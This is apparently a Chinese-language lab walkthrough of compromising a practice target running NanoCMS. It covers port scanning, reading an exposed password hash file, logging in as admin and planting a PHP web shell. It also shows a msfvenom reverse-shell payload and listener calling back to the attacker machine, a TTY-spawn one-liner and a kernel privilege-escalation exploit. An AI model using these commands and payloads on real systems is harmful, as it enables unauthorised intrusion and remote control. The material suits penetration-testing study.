# 模拟环境

靶场下载地址点击跳转

攻击机IP：192.168.1.10

目标机IP：192.168.1.130

  

# 实战

使用NMAP扫描端口

```
nmap -Pn -sV 192.168.1.130
```

![](../Images/2a2532b1d5ba0e59a6ee3478969b3cbd.png)

可以看到开放了很多端口，就不一一列举了，看图。  

  

开放了80-HTTP端口当然是要先看看。

![](../Images/a6765f5b8e5543fdf18ce6ad55025477.png)

  

在浏览网页的过程中发现网站的Blog模块使用的是NanoCMS

![](../Images/829924934d277304305a0269e33f2436.png)

  

Nano CMS是一个基于PHP的内容管理系统 （CMS）。“ Nano CMS是您所能找到的最小的CMS。用户界面和功能非常非常简单和非常容易使用。Nano CMS的核心功能是基于文件并且可以执行 根本不使用任何数据库，这使得安装起来超级容易只是提取就可以了。

  

经过搜索找到有关Nano CMS的漏洞点击跳转

![](../Images/2b420732ee9cba198470660940927333.png)

  

所以我们可以尝试在`http://192.168.1.130/~andy/` 后面加上 `/data/pagesdata.txt`  

```
http://192.168.1.130/~andy/data/pagesdata.txt
```

![](../Images/e5698f8a8494eabc72975485563bc194.png)

得到`s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd"`  

经过解密得到密码为：`shannon`

![](../Images/5f1e522f78ce2c4a9374ece02bff8ee9.png)

  

而且在网站可以看到登录入口

![](../Images/df0eb9c71b3d03f13d2a04cd4254f415.png)

  

尝试使用账号`admin`，密码`shannon`进行登录

![](../Images/0c2f615b64de65332c43f6a455f7b97f.png)

登陆成功。  

  

浏览页面发现在后台可以新建页面选项卡，在这里我们可以自己写入代码，尝试写入木马。

**方法一：使用菜刀连接**

写入一句话木马并命名为PHP1

![](../Images/78ef39035f6fffd163be43816fafddd5.png)

创建成功

![](../Images/c76799871f0f541186763fd2930184a9.png)

  

使用菜刀连接

```
http://192.168.1.130/~andy/index.php?page=php1
```

![](../Images/3ad2b153e34cda5c83d5ca715153b659.png)

  

成功

![](../Images/1d2d48c56cbfa64f09a2a067513acb25.png)

**方法二：使用msfvenom生成php木马，用MSF连接**

使用msfvenom生成PHP木马

```
msfvenom -p php/meterpreter/reverse\_tcp lhost=192.168.1.10 lport=4444 -f raw
```

![](../Images/cf30dc5291095b3ea157ff3bb5e4bfe7.png)

  

将得到的木马代码复制到网页中并命名为PHP2

![](../Images/f338ce0f2c4f5f26d82330e25c9876df.png)

  

创建成功

![](../Images/954c61f1a7766e1be4028284b4bcd243.png)

  

打开msfconsole启动监听

```
root@kali-xmtx:~/桌面#msfconsole 
msf6 > use exploit/multi/handler 
exploit(multi/handler) > set payload php/meterpreter/reverse\_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.10 
msf6 exploit(multi/handler) > set lport 4444  
msf6 exploit(multi/handler) > run  
```

![](../Images/39c5b6bea798c8e9cc347d256279760f.png)

  

在网站的Blog中找到PHP2文件，点击该文件。

![](../Images/83c1f4c7a4b21dc303666cd3e5c3b0f0.png)

  

返回到msfconsole中可以看见成功连接

![](../Images/aa00d8914da9cc2fabaf773fb8248725.png)

  

查看权限  

![](../Images/63ab391ced7f9c6f721d5c8728e50925.png)

  

查看目标机的详细信息

![](../Images/2fc60abcebdddd92a3b18fd6a107fd03.png)

  

在网上搜索以发现可能适用于Linux内核2.6.23.1-42的特权提升漏洞点击跳转

![](../Images/3f061ddf3fce3e4cdc8ac1c45f790631.png)

  

将该利用文件下载到攻击机中

![](../Images/3f2408615897a26f1e4cb0bfb6d12ddb.png)

  

编译该文件

![](../Images/511733141f2ebd1d1eafeefc9ce5bd5f.png)

  

将编译后的文件上传到靶机中

![](../Images/fb2be452d9a695d2f8a79e80048baa23.png)

  

导航到外壳并使用`python -c ‘import pty;pty.spawn(“/bin/bash”)’`使界面变得友好

![](../Images/633762af873b33a8ca80683e628c66b9.png)

  

在执行之前将权限分配给漏洞利用

```
Chmod 777 exploit
```

![](../Images/8fd4b1307a72a350feefb4712e16df47.png)

然后输入以下命令以执行漏洞利用，执行后就成功拿到root权限（在这里因为编译环境不同，所以无法执行成功）  

![](../Images/ed1380ff0ebcd95054ad10fec8f18363.png)

  

# 总结

*   网络扫描（NMAP）
    
*   识别易受攻击的CMS Web应用程序的利用
    
*   访问CMS管理员登录页面和凭据
    
*   生成PHP后门（MSFVENOM）
    
*   上载并执行后门
    
*   反向连接（Metasploit）
    
*   导入python一线式以获得正确的TTY外壳
    
*   利用目标（利用9479）
    
*   取得Root访问权限
